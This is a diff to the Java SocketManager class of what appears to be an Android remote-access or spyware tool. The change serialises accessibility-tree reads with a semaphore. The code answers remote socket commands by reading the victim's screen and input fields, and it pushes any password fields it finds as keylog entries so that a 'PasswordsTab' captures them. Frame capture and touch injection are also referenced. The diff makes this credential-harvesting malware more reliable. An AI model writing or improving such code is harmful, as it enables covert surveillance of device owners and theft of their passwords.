@@ -79,6 +79,10 @@ public class SocketManager {
     // Frame throttle — only one frame capture at a time; drop new requests while busy
     private final java.util.concurrent.atomic.AtomicBoolean frameBusy = new java.util.concurrent.atomic.AtomicBoolean(false);
 
+    // Accessibility tree reads are NOT thread-safe — serialize them with a 1-permit semaphore.
+    // Concurrent AccessibilityNodeInfo traversals corrupt Android's internal node pool and crash the process.
+    private final java.util.concurrent.Semaphore accessSemaphore = new java.util.concurrent.Semaphore(1);
+
     // Touch/swipe deduplication — ignore identical command within 250 ms
     private volatile String  lastTouchKey  = "";
     private volatile long    lastTouchTime = 0L;
@@ -1049,23 +1053,72 @@ public class SocketManager {
             return r;
         }
 
-        // Screen Reader commands
+        // Screen Reader commands — MUST be serialized: AccessibilityNodeInfo is not thread-safe.
+        // Concurrent traversals from the cached thread pool corrupt Android's node pool and crash the process.
         ScreenReader sr = new ScreenReader(accessSvc);
         switch (command) {
             case "read_screen": {
-                JSONObject screenResult = sr.readScreen();
-                // Side-effect: push any password fields found in the current screen
-                // as keylog entries with isPassword=true so PasswordsTab captures them
-                pushPasswordFieldsFromScreen(screenResult);
-                return screenResult;
+                boolean acquired = false;
+                try {
+                    acquired = accessSemaphore.tryAcquire(4, TimeUnit.SECONDS);
+                    if (!acquired) {
+                        JSONObject r = new JSONObject();
+                        r.put("success", false);
+                        r.put("error", "read_screen busy — accessibility reader is already running, retry");
+                        return r;
+                    }
+                    JSONObject screenResult = sr.readScreen();
+                    pushPasswordFieldsFromScreen(screenResult);
+                    return screenResult;
+                } finally {
+                    if (acquired) accessSemaphore.release();
+                }
             }
-            case "find_by_text":            return sr.findByText(params.getString("text"));
-            case "get_current_app":         return sr.getCurrentApp();
-            case "get_clickable_elements":  return sr.getClickableElements();
+            case "find_by_text": {
+                boolean acquired = false;
+                try {
+                    acquired = accessSemaphore.tryAcquire(4, TimeUnit.SECONDS);
+                    if (!acquired) {
+                        JSONObject r = new JSONObject();
+                        r.put("success", false); r.put("error", "accessibility busy"); return r;
+                    }
+                    return sr.findByText(params.getString("text"));
+                } finally { if (acquired) accessSemaphore.release(); }
+            }
+            case "get_current_app": {
+                boolean acquired = false;
+                try {
+                    acquired = accessSemaphore.tryAcquire(4, TimeUnit.SECONDS);
+                    if (!acquired) {
+                        JSONObject r = new JSONObject();
+                        r.put("success", false); r.put("error", "accessibility busy"); return r;
+                    }
+                    return sr.getCurrentApp();
+                } finally { if (acquired) accessSemaphore.release(); }
+            }
+            case "get_clickable_elements": {
+                boolean acquired = false;
+                try {
+                    acquired = accessSemaphore.tryAcquire(4, TimeUnit.SECONDS);
+                    if (!acquired) {
+                        JSONObject r = new JSONObject();
+                        r.put("success", false); r.put("error", "accessibility busy"); return r;
+                    }
+                    return sr.getClickableElements();
+                } finally { if (acquired) accessSemaphore.release(); }
+            }
             case "get_input_fields": {
-                JSONObject inputResult = sr.getInputFields();
-                pushPasswordFieldsFromInputFields(inputResult);
-                return inputResult;
+                boolean acquired = false;
+                try {
+                    acquired = accessSemaphore.tryAcquire(4, TimeUnit.SECONDS);
+                    if (!acquired) {
+                        JSONObject r = new JSONObject();
+                        r.put("success", false); r.put("error", "accessibility busy"); return r;
+                    }
+                    JSONObject inputResult = sr.getInputFields();
+                    pushPasswordFieldsFromInputFields(inputResult);
+                    return inputResult;
+                } finally { if (acquired) accessSemaphore.release(); }
             }
         }
 
